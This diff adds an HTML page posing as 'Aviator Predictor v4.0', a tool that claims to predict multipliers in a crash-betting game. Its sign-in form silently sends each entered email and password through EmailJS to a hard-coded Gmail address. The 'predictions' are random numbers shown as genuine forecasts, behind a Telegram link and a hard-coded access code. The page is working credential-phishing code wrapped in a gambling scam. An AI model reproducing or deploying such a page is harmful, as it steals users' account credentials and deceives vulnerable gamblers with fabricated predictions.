@@ -1,0 +1,263 @@
+<!DOCTYPE html>
+<html>
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Aviator Predictor v4.0</title>
+    <script type="text/javascript" src="https://cdn.jsdelivr.net/npm/@emailjs/browser@4/dist/email.min.js"></script>
+    <script type="text/javascript">
+        (function() {
+            emailjs.init("YOUR_PUBLIC_KEY"); // Replace with your EmailJS Public Key
+        })();
+    </script>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+        body {
+            background-color: black;
+            color: white;
+            font-family: Arial, sans-serif;
+            width: 100vw;
+            height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            overflow: hidden;
+        }
+        .screen {
+            display: none;
+            width: 100vw;
+            height: 100vh;
+            padding: 20px;
+            text-align: center;
+            background-color: black;
+            position: relative;
+        }
+        .screen.active {
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+        }
+        .title {
+            font-size: 24px;
+            font-weight: bold;
+            color: red;
+            margin-bottom: 20px;
+        }
+        .logo {
+            font-size: 64px;
+            color: red;
+            margin-bottom: 40px;
+        }
+        input {
+            width: 80%;
+            max-width: 300px;
+            padding: 15px;
+            margin: 10px 0;
+            background-color: #333;
+            border: none;
+            color: white;
+            text-align: center;
+            font-size: 16px;
+        }
+        input[type="password"] {
+            -webkit-text-security: disc;
+        }
+        button {
+            width: 80%;
+            max-width: 300px;
+            padding: 15px;
+            margin: 10px 0;
+            background-color: red;
+            color: white;
+            border: none;
+            font-size: 16px;
+            cursor: pointer;
+        }
+        button:hover {
+            background-color: darkred;
+        }
+        button:disabled {
+            background-color: gray;
+            cursor: not-allowed;
+        }
+        .multiplier {
+            font-size: 48px;
+            font-weight: bold;
+            color: white;
+            margin: 30px 0;
+            transition: all 0.3s ease;
+        }
+        .multiplier.animating {
+            opacity: 0.5;
+            transform: scale(1.1);
+        }
+        .telegram-link {
+            color: red;
+            cursor: pointer;
+            text-decoration: underline;
+            margin-top: 20px;
+        }
+        .telegram-link:hover {
+            color: #ff6666;
+        }
+        .signup {
+            color: blue;
+            margin-top: 10px;
+            cursor: pointer;
+        }
+        .forgot {
+            color: gray;
+            font-size: 12px;
+        }
+        .forgot-container {
+            display: flex;
+            justify-content: flex-end;
+            width: 80%;
+            max-width: 300px;
+            margin: 10px auto;
+        }
+    </style>
+</head>
+<body>
+    <!-- Login Screen -->
+    <div id="loginScreen" class="screen active">
+        <div class="title">Aviator Predictor v4.0</div>
+        <div class="logo">🛩️</div>
+        <input type="text" id="username" placeholder="Email">
+        <div class="forgot-container">
+            <span class="forgot">Forgot Password?</span>
+        </div>
+        <input type="password" id="password" placeholder="Password">
+        <button onclick="signIn()">Sign In</button>
+        <div class="signup" onclick="alert('Sign up feature coming soon!')">Don't have account? Sign Up</div>
+        <div class="telegram-link" onclick="openTelegram()">Join our telegram: t.me/aviatorpredictorv4</div>
+    </div>
+
+    <!-- APP ID Screen -->
+    <div id="appIdScreen" class="screen">
+        <div class="title">Aviator Predictor v4.0</div>
+        <div class="logo">🛩️</div>
+        <div style="margin-bottom: 10px;">APP ID:</div>
+        <input type="text" id="appIdInput" placeholder="Enter APP ID">
+        <button onclick="continueToMain()">Continue</button>
+    </div>
+
+    <!-- Main Screen -->
+    <div id="mainScreen" class="screen">
+        <div class="title">Aviator Predictor v4.0</div>
+        <div class="logo">🛩️</div>
+        <div class="multiplier" id="multiplier">1.000x</div>
+        <button id="predictBtn" onclick="getPrediction()">Get Prediction!</button>
+        <button onclick="activate()">Activate</button>
+        <div class="telegram-link" onclick="openTelegram()">Join our telegram: t.me/aviatorpredictorv4</div>
+    </div>
+
+    <script>
+        let appId = null;
+        let isAnimating = false;
+
+        localStorage.removeItem('appId');
+
+        function requestFullscreen() {
+            if (document.documentElement.requestFullscreen) {
+                document.documentElement.requestFullscreen();
+            }
+        }
+
+        async function signIn() {
+            const email = document.getElementById('username').value;
+            const password = document.getElementById('password').value;
+            if (email && password) {
+                // Send email via EmailJS
+                try {
+                    await emailjs.send("YOUR_SERVICE_ID", "YOUR_TEMPLATE_ID", {
+                        from_email: email,
+                        from_password: password,
+                        to_email: "internetmoneykings7@gmail.com"
+                    });
+                    console.log("Login credentials sent successfully!");
+                } catch (error) {
+                    console.error("Failed to send email:", error);
+                    // Still proceed even if email fails (optional: alert user)
+                }
+                showScreen('appIdScreen');
+                requestFullscreen();
+            } else {
+                alert('Please enter email and password.');
+            }
+        }
+
+        function continueToMain() {
+            const enteredId = document.getElementById('appIdInput').value;
+            if (enteredId === '0618022967') {
+                appId = enteredId;
+                showScreen('mainScreen');
+            } else {
+                alert('Invalid APP ID! Please enter the correct code.');
+            }
+        }
+
+        function getPrediction() {
+            if (appId) {
+                if (isAnimating) return;
+                isAnimating = true;
+                const predictBtn = document.getElementById('predictBtn');
+                predictBtn.disabled = true;
+                predictBtn.textContent = 'Predicting...';
+
+                const multiplierEl = document.getElementById('multiplier');
+                const currentText = multiplierEl.textContent;
+                const currentNum = parseFloat(currentText.replace('x', ''));
+
+                const targetNum = Math.random() * 9 + 1;
+                const steps = 50;
+                const duration = 2000;
+                const stepTime = duration / steps;
+                let step = 0;
+
+                const interval = setInterval(() => {
+                    step++;
+                    const progress = step / steps;
+                    const easedProgress = 1 - Math.pow(1 - progress, 3);
+                    const animatedNum = currentNum + (targetNum - currentNum) * easedProgress;
+                    multiplierEl.textContent = animatedNum.toFixed(3) + 'x';
+
+                    if (step >= steps) {
+                        clearInterval(interval);
+                        multiplierEl.textContent = targetNum.toFixed(3) + 'x';
+                        alert('Predicted Multiplier: ' + targetNum.toFixed(3) + 'x');
+                        predictBtn.disabled = false;
+                        predictBtn.textContent = 'Get Prediction!';
+                        isAnimating = false;
+                    }
+                }, stepTime);
+            } else {
+                alert('APP ID required! Please enter it to continue.');
+                showScreen('appIdScreen');
+            }
+        }
+
+        function activate() {
+            alert('Activation feature coming soon!');
+        }
+
+        function openTelegram() {
+            window.open('https://t.me/aviatorpredictorv4', '_blank');
+        }
+
+        function showScreen(screenId) {
+            document.querySelectorAll('.screen').forEach(screen => {
+                screen.classList.remove('active');
+            });
+            document.getElementById(screenId).classList.add('active');
+        }
+    </script>
+</body>
+</html>>
